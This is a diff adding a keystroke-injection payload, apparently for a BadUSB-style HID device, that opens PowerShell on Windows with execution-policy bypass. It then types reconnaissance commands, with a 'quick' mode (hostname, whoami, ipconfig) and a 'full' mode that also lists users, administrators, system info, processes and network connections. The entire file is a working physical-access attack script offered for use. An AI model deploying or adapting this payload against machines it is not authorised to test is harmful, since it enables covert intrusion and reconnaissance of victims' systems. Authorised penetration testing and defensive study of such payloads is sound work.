@@ -1,0 +1,25 @@
+NAME Conditional Recon
+DESCRIPTION Runs different recon based on user-selected mode
+CATEGORY recon
+PLATFORMS WIN
+OPTION MODE quick "Recon mode: quick or full"
+OPTION DELAY 2000 "Initial HID delay (ms)"
+PLATFORM WIN
+DELAY {{DELAY}}
+GUI r
+DELAY 800
+STRING powershell -nop -ep bypass
+ENTER
+DELAY 1500
+VAR $MODE = {{MODE}}
+IF $MODE == quick
+LED_COLOR CYAN
+STRINGLN hostname; whoami; ipconfig /all
+ELSE
+LED_COLOR YELLOW
+STRINGLN hostname; whoami; ipconfig /all; net user; net localgroup administrators; systeminfo; tasklist; netstat -ano
+END_IF
+DELAY 2000
+LED_COLOR GREEN
+STRING exit
+ENTER
